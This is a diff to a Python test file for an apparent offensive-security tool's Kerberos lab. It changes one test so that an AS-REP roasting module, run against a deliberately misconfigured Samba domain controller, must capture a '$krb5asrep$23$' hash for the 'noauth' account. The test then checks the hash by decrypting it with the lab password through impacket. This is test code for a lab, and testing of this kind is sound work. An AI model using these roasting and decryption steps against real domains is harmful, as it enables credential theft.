@@ -722,12 +722,10 @@ class TestRoastLab(unittest.TestCase):
         self.assertIn("backup_svc", labels)
         self.assertIn("web_svc", labels)
 
-    def test_asreproast_graceful_when_kdc_refuses(self):
-        # The Samba AD KDC in this build does not honor
-        # UF_DONT_REQUIRE_PREAUTH (or NO_AUTH_DATA_REQUIRED): it demands
-        # preauth from every account, so AS-REP roasting is impossible
-        # against it. The module must handle that cleanly: no traceback,
-        # no hashes, honest summary. (Against a Windows KDC it roasts.)
+    def test_asreproast_hits_no_preauth_account(self):
+        # The lab flips all three Samba switches ([kdc] require-preauth=no
+        # + DONT_REQ_PREAUTH on noauth AND krbtgt), so the roast works:
+        # noauth yields a hash, analyst (healthy) is skipped.
         out, hashes = self._run(
             "use auxiliary/attack/asreproast",
             f"set RHOSTS {HOST}",
@@ -736,8 +734,21 @@ class TestRoastLab(unittest.TestCase):
             "run",
         )
         self.assertNotIn("Traceback", out)
-        self.assertIn("0/2 roastable", out)
-        self.assertEqual(hashes, [])
+        self.assertIn("1/2 roastable", out)
+        self.assertEqual(len(hashes), 1)
+        self.assertIn("noauth", hashes[0]["label"])
+        self.assertTrue(hashes[0]["content"].startswith("$krb5asrep$23$"))
+        # the hash is REAL — it decrypts with NT(Noauth2024!)
+        from Cryptodome.Hash import MD4
+        from impacket.krb5.crypto import _enctype_table, Key
+        from impacket.krb5.asn1 import EncASRepPart
+        from pyasn1.codec.der import decoder
+        parts = hashes[0]["content"].split("$")
+        blob = bytes.fromhex(parts[3].split(":", 1)[1]) + bytes.fromhex(parts[4])
+        md4 = MD4.new()
+        md4.update("Noauth2024!".encode("utf-16-le"))
+        plain = _enctype_table[23].decrypt(Key(23, md4.digest()), 3, blob)
+        decoder.decode(plain, asn1Spec=EncASRepPart())
 
 
 @unittest.skipUnless(docker_available(), "docker daemon not available")
